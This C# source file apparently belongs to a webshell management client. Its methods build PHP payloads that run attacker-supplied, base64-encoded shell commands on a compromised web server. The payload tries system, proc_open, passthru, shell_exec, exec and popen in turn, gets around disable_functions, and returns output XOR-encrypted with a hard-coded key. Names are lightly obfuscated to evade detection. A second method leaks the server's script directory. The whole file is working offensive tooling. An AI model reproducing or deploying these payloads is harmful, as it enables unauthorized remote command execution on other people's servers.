﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace WpfApp1.Payload.php.xor
{
    public class Cmd
    {
        public string CMD(string cmd, string path)
        {
            string poc = $@"
@error_reporting(0);
function getSafeStr($str) {{
	$s1 = iconv('utf-8','gbk//IGNORE',$str);
	$s0 = iconv('gbk','utf-8//IGNORE',$s1);
	if($s0 == $str) {{
		return $s0;
	}} else {{
		return iconv('gbk','utf-8//IGNORE',$str);
	}}
}}
function main($cmd,$path) {{
	@set_time_limit(0);
	@ignore_user_abort(1);
	@ini_set('max_execution_time', 0);
	$result = array();
	$PadtJn = @ini_get('disable_functions');
	if (! empty($PadtJn)) {{
		$PadtJn = preg_replace('/[, ]+/', ',', $PadtJn);
		$PadtJn = explode(',', $PadtJn);
		$PadtJn = array_map('trim', $PadtJn);
	}} else {{
		$PadtJn = array();
	}}
	$c = $cmd;
	if (FALSE !== strpos(strtolower(PHP_OS), 'win')) {{
		$c = $c . "" 2>&1\n"";
	}}
	$JueQDBH = 'is_callable';
	$Bvce = 'in_array';
	if ($JueQDBH('system') and ! $Bvce('system', $PadtJn)) {{
		ob_start();
		system($c);
		$kWJW = ob_get_contents();
		ob_end_clean();
	}} else if ($JueQDBH('proc_open') and ! $Bvce('proc_open', $PadtJn)) {{
		$handle = proc_open($c, array(            array(                'pipe',                'r'            ),            array(                'pipe',                'w'            ),            array(                'pipe',                'w'            )        ), $pipes);
		$kWJW = NULL;
		while (! feof($pipes[1])) {{
			$kWJW .= fread($pipes[1], 1024);
		}}
		@proc_close($handle);
	}} else if ($JueQDBH('passthru') and ! $Bvce('passthru', $PadtJn)) {{
		ob_start();
		passthru($c);
		$kWJW = ob_get_contents();
		ob_end_clean();
	}} else if ($JueQDBH('shell_exec') and ! $Bvce('shell_exec', $PadtJn)) {{
		$kWJW = shell_exec($c);
	}} else if ($JueQDBH('exec') and ! $Bvce('exec', $PadtJn)) {{
		$kWJW = array();
		exec($c, $kWJW);
		$kWJW = join(chr(10), $kWJW) . chr(10);
	}} else if ($JueQDBH('exec') and ! $Bvce('popen', $PadtJn)) {{
		$fp = popen($c, 'r');
		$kWJW = NULL;
		if (is_resource($fp)) {{
			while (! feof($fp)) {{
				$kWJW .= fread($fp, 1024);
			}}
		}}
		@pclose($fp);
	}} else {{
		$kWJW = 0;
		$result[""status""] = base64_encode(""fail"");
		$result[""msg""] = base64_encode(""none of proc_open/passthru/shell_exec/exec/exec is available"");
		$key = $_SESSION['k'];
		echo encrypt(json_encode($result));
		return;
	}}
	$result[""status""] = (""success"");
	$result[""msg""] = (getSafeStr($kWJW));
	echo Encrypt(json_encode($result));
}}
function Encrypt($data) {{
	$key=""e45e329feb5d925b"";
	for ($i=0;$i<strlen($data);$i++) {{
		$data[$i] = $data[$i]^$key[$i+1&15];
	}}
	$bs=""base64_"".""encode"";
	$after=$bs($data."""");
	return $after;
}}
$cmd=""{cmd}"";
$cmd=base64_decode($cmd);
$path=""{path}"";
$path=base64_decode($path);
main($cmd,$path);";
            return poc;
        }


        public string info()
        {
            string root = @"$d=dirname($_SERVER[""SCRIPT_FILENAME""]);echo Encrypt($d);
function Encrypt($data) {
	$key=""e45e329feb5d925b"";
	for ($i=0;$i<strlen($data);$i++) {
		$data[$i] = $data[$i]^$key[$i+1&15];
	}
	$bs=""base64_"".""encode"";
	$after=$bs($data."""");
	return $after;
}";
            return root;
        }


    }
}
